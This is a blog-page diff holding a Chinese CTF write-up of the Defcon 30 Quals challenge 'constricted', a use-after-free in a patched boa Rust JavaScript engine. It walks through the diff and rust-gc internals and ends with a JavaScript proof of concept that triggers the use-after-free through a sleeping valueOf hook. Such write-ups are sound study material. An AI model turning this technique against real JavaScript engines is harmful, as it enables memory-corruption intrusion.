@@ -1,0 +1,878 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+   
+  <meta name="keywords" content="Defcon, CTF, Pwn,漏洞挖掘, 调试, 代码, 计算机科学, Kiprey, Blog, 二进制，信息安全" />
+   
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    Defcon-30-Quals rust-pwn constricted 复盘笔记 |  Kiprey&#39;s Blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+  
+  
+
+  
+<script>
+var _hmt = _hmt || [];
+(function() {
+	var hm = document.createElement("script");
+	hm.src = "https://hm.baidu.com/hm.js?acff2772e1f74a625e1e26c280afa6c2";
+	var s = document.getElementsByTagName("script")[0]; 
+	s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<link rel="alternate" href="/atom.xml" title="Kiprey's Blog" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-defcon30quals_constricted"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  Defcon-30-Quals rust-pwn constricted 复盘笔记
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2022/08/defcon30quals_constricted/" class="article-date">
+  <time datetime="2022-08-26T16:00:00.000Z" itemprop="datePublished">2022-08-27</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">6.3k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">28 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="一、简介">一、简介</h2>
+<p>这里将记录着本人复盘 Defcon 30 Quals 中 <code>constricted</code> 的复盘笔记。</p>
+<p>这道题为 <code>boa</code> 项目提供了一个 git diff，要求在应用这个 diff 后对 boa 进行漏洞利用。boa 是一个<strong>使用 rust 编写的 javascript 引擎</strong>，要想 pwn 掉它就得编写 JS 的漏洞利用脚本。</p>
+<p>当初做这题时自己还没接触过 rust，这次 <s>学成归来后</s> 可以好好看看这题。</p>
+<p>这题的意图是想说明，<strong>即便是用 rust 编写的程序也仍然会存在漏洞</strong>。</p>
+<a id="more"></a>
+<blockquote>
+<p>注意，本题的调试是在实机中进行，<strong>非 docker 环境</strong>，因此 exp 可能不通用。</p>
+</blockquote>
+<h2 id="二、diff-内容">二、diff 内容</h2>
+<p>这里的 diff 总结起来大致如下：</p>
+<ol>
+<li>
+<p>在程序启动时随机 mmap 了一块内存。这里的 ctor 说明这个 init 函数需要在执行 main 函数前被执行：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> libc::&#123;getrandom, mmap, MAP_PRIVATE, MAP_ANON&#125;;</span><br><span class="line"><span class="keyword">use</span> std::ptr;</span><br><span class="line"><span class="keyword">use</span> ctor::*;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[ctor]</span></span><br><span class="line"><span class="keyword">unsafe</span> <span class="function"><span class="keyword">fn</span> <span class="title">init</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> buf = [<span class="number">0u8</span>; <span class="number">4</span>];</span><br><span class="line">    getrandom(buf.as_mut_ptr() <span class="keyword">as</span> *<span class="keyword">mut</span> libc::c_void, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">let</span> off = std::mem::transmute::&lt;[<span class="built_in">u8</span>; <span class="number">4</span>], <span class="built_in">u32</span>&gt;(buf).to_le() <span class="keyword">as</span> <span class="built_in">usize</span>;</span><br><span class="line">    <span class="keyword">let</span> off = off &lt;&lt; <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">let</span> length = <span class="number">0x80000000</span> + off;</span><br><span class="line">    mmap(ptr::null_mut(), length, <span class="number">0</span>, MAP_PRIVATE | MAP_ANON, -<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>引入一个新的 JSObject 对象 <code>TimedCache</code>：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; <span class="keyword">let</span> v = <span class="keyword">new</span> TimedCache()</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">&gt;&gt; v</span><br><span class="line">TimedCache()</span><br></pre></td></tr></table></figure>
+<p>TimedCache 类代码在 <code>boa_engine/src/builtins/timed_cache/mod.rs</code> 中，这个类中有三个函数，分别是 <code>get</code>、<code>set</code> 和 <code>has</code>。这三个方法都和时间有关，<strong>功能类似一个定时器</strong>，可以用 set 函数安装定时器、get 函数获取目标定时器剩余时间，以及用 has 函数查看定时器是否超时。</p>
+</li>
+<li>
+<p>在 console 类上额外实现了几个方法，分别是：</p>
+<ol>
+<li>
+<p><code>console.sysbreak()</code>：调用该函数会触发一个 int3 中断。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; <span class="built_in">console</span>.sysbreak()</span><br><span class="line">[<span class="number">1</span>]    <span class="number">155238</span> trace trap (core dumped)  target/debug/boa</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p><code>console.sleep(ms)</code>：线程暂停一段时间，单位毫秒。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; console.sleep(<span class="number">1000</span>) <span class="comment">// sleep 1s</span></span><br><span class="line">undefined</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p><code>console.collectGarbage()</code>：强制触发垃圾回收。这里触发的垃圾回收机制是 <code>gc = &quot;0.4.1&quot;</code> crate 内的，即 <a href="https://github.com/Manishearth/rust-gc" target="_blank" rel="noopener">rust-gc</a>。</p>
+</li>
+<li>
+<p>增强了 <code>console.debug</code> 方法，以更好的输出信息。</p>
+</li>
+</ol>
+</li>
+<li>
+<p>在 <code>boa_engine/src/object/internal_methods/</code>文件夹中，为半数以上的类做了个修改，让<strong>被修改类的每个静态 internal method 对象</strong>都<strong>分配在堆上，而不是在 data 段上</strong>。</p>
+</li>
+</ol>
+<h2 id="三、漏洞定位">三、漏洞定位</h2>
+<p>从上面总结的 diff 可以看出，diff 中：</p>
+<ol>
+<li>
+<p>提供了<code>console.sleep</code>、<code>TimedCache</code> 这种与时间处理有关的方法和类。</p>
+</li>
+<li>
+<p>大肆修改静态对象的分配位置<strong>至堆上</strong>（原本在 data 段上好好的偏偏就要改到堆上）。</p>
+</li>
+<li>
+<p>主动暴露出 rust-gc 强制触发垃圾回收的接口 <code>console.collectGarbage</code>。</p>
+</li>
+</ol>
+<p>那么这题无疑就是和 rust-gc 做斗争。可能有人会问，rust 不是不需要 gc 么？的确如此，但是只通过 Arc 和 Rc 来管理内存可能会造成循环引用等非常难顶的情况， 同时也加大了开发难度。为了平衡内存管理的安全性与开发效率，rust-gc crate 便发挥出了它的作用。</p>
+<p>rust-gc 是一个 <code>mark-sweep</code> 类型的 GC，只有被 mark 的对象才会保留，没有 mark 的对象会在垃圾回收时被销毁。相关信息在 <a href="https://github.com/Manishearth/rust-gc" target="_blank" rel="noopener">rust-gc - github</a> 上，一定要先看完里面的内容，了解 rust-gc 大致的用法。</p>
+<p>在之前总结 diff 内容时我省略掉了关于 TimedCache 类的实现细节，而这里就是关键。在 <code>boa_engine/src/builtins/timed_cache/mod.rs</code> 中， <code>TimedCacheValue</code> 类使用 <code>boa_gc</code> （即 rust-gc 的 wrapper）来管理类实例：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[derive(Debug, Clone)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="class"><span class="keyword">struct</span> <span class="title">TimeCachedValue</span></span> &#123;</span><br><span class="line">    expire: <span class="built_in">u128</span>,</span><br><span class="line">    data: JsObject,</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">impl</span> Finalize <span class="keyword">for</span> TimeCachedValue &#123;&#125;</span><br><span class="line"><span class="keyword">unsafe</span> <span class="keyword">impl</span> Trace <span class="keyword">for</span> TimeCachedValue &#123;</span><br><span class="line">    custom_trace!(this, &#123;</span><br><span class="line">        <span class="keyword">if</span> !this.is_expired() &#123;</span><br><span class="line">            mark(&amp;this.data);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>若 <code>TimeCachedValue</code> 中<strong>所保存的计时器超时</strong>，那么 TimeCachedValue 实例中的 <strong>data 将不再被标记</strong>，这意味着在超时后的某个时间点，这个 data 所占用的内存将会被释放。注意 data 字段的类型 <code>JsObject</code> 也是一个 <code>GC</code> 类型：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="class"><span class="keyword">struct</span> <span class="title">JsObject</span></span> &#123;</span><br><span class="line">    inner: Gc&lt;boa_gc::Cell&lt;Object&gt;&gt;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但要注意的是，<code>Gc&lt;_&gt;</code> 只是一个 <code>Gc::Cell</code> 的指针类型。换句话说虽然 <code>Gc&lt;_&gt;</code> 指向的 Cell 被释放了，但 <code>Gc&lt;_&gt;</code> 本身还在 <code>TimeCachedValue</code>中，如果能在释放 <code>Gc::Cell</code> 后把 <code>Gc&lt;_&gt;</code> 指针偷出来，那就可以造成 UAF。</p>
+<p>在整个 TimedCache 类的实现中，只有一处地方比较可疑，那就是 get 函数：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">let</span> JsValue::Object(<span class="keyword">ref</span> object) = this &#123;</span><br><span class="line">    <span class="comment">// 1. check expire</span></span><br><span class="line">    <span class="keyword">if</span> !check_is_not_expired(object, key, context)? &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">Ok</span>(JsValue::undefined());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> new_lifetime = args.get_or_undefined(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">let</span> expire = <span class="keyword">if</span> !new_lifetime.is_undefined() &amp;&amp; !new_lifetime.is_null() &#123;</span><br><span class="line">        <span class="comment">// 2. calc new expire. Is it possible to collect `data`?</span></span><br><span class="line">        <span class="literal">Some</span>(calculate_expire(new_lifetime, context)?)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="literal">None</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="literal">Some</span>(cache) = object.borrow_mut().as_timed_cache_mut() &#123;</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> <span class="literal">Some</span>(cached_val) = cache.get_mut(key) &#123;</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">let</span> <span class="literal">Some</span>(expire) = expire &#123;</span><br><span class="line">                cached_val.expire = expire <span class="keyword">as</span> <span class="built_in">u128</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 3. Maybe return freed reference of `data`</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">Ok</span>(JsValue::Object(cached_val.data.clone()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">Ok</span>(JsValue::undefined());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在 <code>calculate_expire</code> 函数中，会对传入的 lifetime 参数调用 <code>to_integer_or_infinity</code> 方法：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">calculate_expire</span></span>(lifetime: &amp;JsValue, context: &amp;<span class="keyword">mut</span> Context) -&gt; JsResult&lt;<span class="built_in">i128</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> lifetime = lifetime.to_integer_or_infinity(context)?;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果传入的 lifetime 是一个精心构建的 object，那么我们便可以在 boa 调用 <code>calculate_expire</code> 时执行传入 lifetime 对象的 hook 函数，在这个函数中进行 sleep + gc。这样一来，在 <code>TimedCache::get</code> 函数中就可以尝试返回一个被释放掉的 gc 引用，触发 UAF。</p>
+<p>后续便可通过堆喷 + UAF 来进行漏洞利用。</p>
+<h2 id="四、浅析-rust-gc">四、浅析 rust-gc</h2>
+<p>在做题时顺便研究了一下 rust-gc 库，看看有没有多线程竞争的可能。调试发现整个 boa 进程<strong>竟然只有一个主线程</strong>，当创建的对象总大小超过某个阈值后，boa 才会主动触发 GC 进行 mark &amp; sweep，这个初始阈值每个线程是 100 字节：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /root/.cargo/registry/src/mirrors.tuna.tsinghua.edu.cn-df7c3c540f42cdbd/gc-0.4.1/src/gc.rs</span></span><br><span class="line"><span class="keyword">impl</span>&lt;T: Trace&gt; GcBox&lt;T&gt; &#123;</span><br><span class="line">    <span class="comment">/// Allocates a garbage collected `GcBox` on the heap,</span></span><br><span class="line">    <span class="comment">/// and appends it to the thread-local `GcBox` chain.</span></span><br><span class="line">    <span class="comment">///</span></span><br><span class="line">    <span class="comment">/// A `GcBox` allocated this way starts its life rooted.</span></span><br><span class="line">    <span class="keyword">pub</span>(<span class="keyword">crate</span>) <span class="function"><span class="keyword">fn</span> <span class="title">new</span></span>(value: T) -&gt; NonNull&lt;<span class="keyword">Self</span>&gt; &#123;</span><br><span class="line">        GC_STATE.with(|st| &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut</span> st = st.borrow_mut();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// XXX We should probably be more clever about collecting</span></span><br><span class="line">            <span class="keyword">if</span> st.bytes_allocated &gt; st.threshold &#123;</span><br><span class="line">                <span class="comment">// HERE! </span></span><br><span class="line">                collect_garbage(&amp;<span class="keyword">mut</span> *st);</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>rust-gc 库不长，花点时间理解库的实现对做题帮助巨大。</p>
+</blockquote>
+<p>每一个 GC 对象都有一个 GC header，用来记录当前对象的一些额外属性。例如 <code>mark</code> 标记，<code>next</code> GC 链上的下一个对象引用等等：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> gcbox = <span class="built_in">Box</span>::into_raw(<span class="built_in">Box</span>::new(GcBox &#123;</span><br><span class="line">    header: GcBoxHeader &#123;</span><br><span class="line">        roots: Cell::new(<span class="number">1</span>),</span><br><span class="line">        marked: Cell::new(<span class="literal">false</span>),</span><br><span class="line">        next: st.boxes_start.take(),</span><br><span class="line">    &#125;,</span><br><span class="line">    data: value,</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure>
+<p>当应用程序调用 <code>Gc::new</code> 函数创建堆对象时，该函数实际就会通过上面的 <code>GcBox</code>来创建对象：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">impl</span>&lt;T: Trace&gt; Gc&lt;T&gt; &#123;</span><br><span class="line">    <span class="comment">/// Constructs a new `Gc&lt;T&gt;` with the given value.</span></span><br><span class="line">    <span class="comment">///</span></span><br><span class="line">    <span class="comment">/// # Collection</span></span><br><span class="line">    <span class="comment">///</span></span><br><span class="line">    <span class="comment">/// This method could trigger a garbage collection.</span></span><br><span class="line">    <span class="comment">///</span></span><br><span class="line">    <span class="comment">/// # Examples</span></span><br><span class="line">    <span class="comment">///</span></span><br><span class="line">    <span class="comment">/// </span></span><br><span class="line">    <span class="comment">/// use gc::Gc;</span></span><br><span class="line">    <span class="comment">///</span></span><br><span class="line">    <span class="comment">/// let five = Gc::new(5);</span></span><br><span class="line">    <span class="comment">/// assert_eq!(*five, 5);</span></span><br><span class="line">    <span class="comment">/// </span></span><br><span class="line">    <span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">new</span></span>(value: T) -&gt; <span class="keyword">Self</span> &#123;</span><br><span class="line">        <span class="built_in">assert!</span>(mem::align_of::&lt;GcBox&lt;T&gt;&gt;() &gt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsafe</span> &#123;</span><br><span class="line">            <span class="comment">// Allocate the memory for the object</span></span><br><span class="line">            <span class="keyword">let</span> ptr = GcBox::new(value);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// When we create a Gc&lt;T&gt;, all pointers which have been moved to the</span></span><br><span class="line">            <span class="comment">// heap no longer need to be rooted, so we unroot them.</span></span><br><span class="line">            (*ptr.as_ptr()).value().unroot();</span><br><span class="line">            <span class="keyword">let</span> gc = Gc &#123;</span><br><span class="line">                ptr_root: Cell::new(NonNull::new_unchecked(ptr.as_ptr())),</span><br><span class="line">                marker: PhantomData,</span><br><span class="line">            &#125;;</span><br><span class="line">            gc.set_root();</span><br><span class="line">            gc</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>而 <code>Gc&lt;_&gt;</code> 结构体只会持有指向 <code>GcBox&lt;_&gt;</code> 的指针，同时也只有<code>GcBox&lt;_&gt;</code> 的分配与释放才会实际受到 mark&amp;sweep GC 的管理。</p>
+<p>当触发 GC 开始 mark 阶段后，GC 会遍历之前维护的 <code>GcBox&lt;_&gt;</code> 链上的元素，将其挨个标记，并递归标记当前结构体的<strong>子字段</strong>。每个 GcBox 都有一个 root 字段（取值只有0和1），用于表示当前 GcBox 是否在 GC 维护的单向链表上。如果有些 GcBox 是其他 GcBox 的子字段，那么<strong>这些身为子字段的 GcBox，其 root 属性就会为 0</strong>。GC 回收的正是那些 <strong>不在 GcBox 链上且无 mark</strong> 的 GcBox。</p>
+<p>在通过 <code>Gc::new</code> 创建 GcBox 时，GcBox 不会放置在 Gc 链上；但 gc 可以通过 boa 最顶端的 gc 持有者，一步步递归向下执行 trace 来标记各个 <code>GcBox&lt;_&gt;</code>。整个流程非常的自洽，没有问题。而本题之所以会有漏洞，是因为<strong>boa 对 TimeCachedValue 类实现的 <code>custom_trace</code>存在错误</strong> ：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsafe</span> <span class="keyword">impl</span> Trace <span class="keyword">for</span> TimeCachedValue &#123;</span><br><span class="line">    custom_trace!(this, &#123;</span><br><span class="line">        <span class="comment">// 外部可变条件</span></span><br><span class="line">        <span class="keyword">if</span> !this.is_expired() &#123;</span><br><span class="line">            mark(&amp;this.data);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将<strong>外部可变条件判断</strong>引入进 trace 中，就会导致出现<strong>虽然整体上这个 Gc 变量还在对象树上，但是 GC 中的数据已经被释放</strong>的情况。</p>
+<blockquote>
+<p>这里的外部可变条件是：<strong>时间</strong>。</p>
+<p>换句话说，这个 trace 函数的实现违背了一个规则：<strong>不允许在变量所有权没有发生任何修改的情况下释放变量</strong>。</p>
+</blockquote>
+<p>下面是一个正确使用 custom_trace 的例子：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsafe</span> <span class="keyword">impl</span>&lt;V: Trace, S: BuildHasher&gt; Trace <span class="keyword">for</span> OrderedMap&lt;V, S&gt; &#123;</span><br><span class="line">    custom_trace!(this, &#123;</span><br><span class="line">        <span class="keyword">for</span> (k, v) <span class="keyword">in</span> this.map.iter() &#123;</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">let</span> MapKey::Key(key) = k &#123;</span><br><span class="line">                mark(key);</span><br><span class="line">            &#125;</span><br><span class="line">            mark(v);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到该实现是尽心尽力地将 trace 传播进子字段中，没有引入其他外部可变条件。</p>
+<h2 id="五、漏洞利用">五、漏洞利用</h2>
+<h3 id="a-UAF">a. UAF</h3>
+<p>在测试时无意间触发了一个 panic，代码如下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tc = <span class="keyword">new</span> TimedCache()</span><br><span class="line">tc.set(<span class="string">'k'</span>, &#123;&#125;, <span class="number">0</span>) <span class="comment">// lifetime = 0 使得计时器立即过期，JsObject 不再被 mark</span></span><br><span class="line">[ctrl+D 触发 EOF，垃圾回收开始] <span class="comment">// panic!</span></span><br></pre></td></tr></table></figure>
+<p>稍微整了一个稳触发版本：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tc = new TimedCache()</span><br><span class="line">tc.set(<span class="string">'k'</span>, &#123;&#125;, <span class="number">0</span>)</span><br><span class="line">tc = null</span><br><span class="line">console.collectGarbage() <span class="comment">// panic!</span></span><br></pre></td></tr></table></figure>
+<p>stack trace 很长，大致可以看出和 GC 有关。看了一下代码，这个 panic 是为了限制 <code>Gc&lt;_&gt;</code> <strong>勿在 sweep 阶段对所持有的 <code>GcBox&lt;_&gt;</code> 指针进行解引用</strong>，因为这会造成非预期情况，不够安全。</p>
+<p>这段代码产生该类型 panic 的原因是因为 UAF。上面代码中 JS 对象<code>{}</code> 所在的 <code>GcBox</code> 本应该为 root=0，即正常<strong>不会进入</strong> unsafe 代码块，但由于内存释放，root 字段所在内存的值发生修改，因此 <code>self.rooted()</code> 返回 true，进入 unsafe 代码区域，触发 check 造成 panic：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">impl</span>&lt;T: Trace + ?<span class="built_in">Sized</span>&gt; <span class="built_in">Drop</span> <span class="keyword">for</span> Gc&lt;T&gt; &#123;</span><br><span class="line">    <span class="meta">#[inline]</span></span><br><span class="line">    <span class="function"><span class="keyword">fn</span> <span class="title">drop</span></span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="comment">// If this pointer was a root, we should unroot it.</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">self</span>.rooted() &#123;</span><br><span class="line">            <span class="comment">// 不应该进入此分支</span></span><br><span class="line">            <span class="keyword">unsafe</span> &#123;</span><br><span class="line">                <span class="keyword">self</span>.inner().unroot_inner();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>一路研究到现在，根据现有的思路，尝试构建出以下 POC:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// console wrapper</span></span><br><span class="line"><span class="keyword">let</span> log = <span class="function">(<span class="params">x</span>) =&gt;</span> &#123; <span class="built_in">console</span>.log(x) &#125;;</span><br><span class="line"><span class="keyword">let</span> debug = <span class="function">(<span class="params">x</span>) =&gt;</span> &#123; log(<span class="built_in">console</span>.debug(x)) &#125;;</span><br><span class="line"><span class="keyword">let</span> gc = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.collectGarbage();</span><br><span class="line"><span class="keyword">let</span> sleep = <span class="function">(<span class="params">x</span>) =&gt;</span> <span class="built_in">console</span>.sleep(x);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> fake_timeout = &#123; valueOf() &#123;</span><br><span class="line">    log(<span class="string">"[+] fake_timeout called"</span>);</span><br><span class="line">    sleep(<span class="number">2000</span>);</span><br><span class="line">    gc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> cache = <span class="keyword">new</span> TimedCache();</span><br><span class="line">cache.set(<span class="string">'key'</span>, <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">1024</span>), <span class="number">1000</span>);</span><br><span class="line"><span class="keyword">let</span> uaf_obj = cache.get(<span class="string">"key"</span>, fake_timeout);</span><br><span class="line">debug(uaf_obj);</span><br></pre></td></tr></table></figure>
+<p>最后的 debug 输出了一个 JSObject，符合预期：</p>
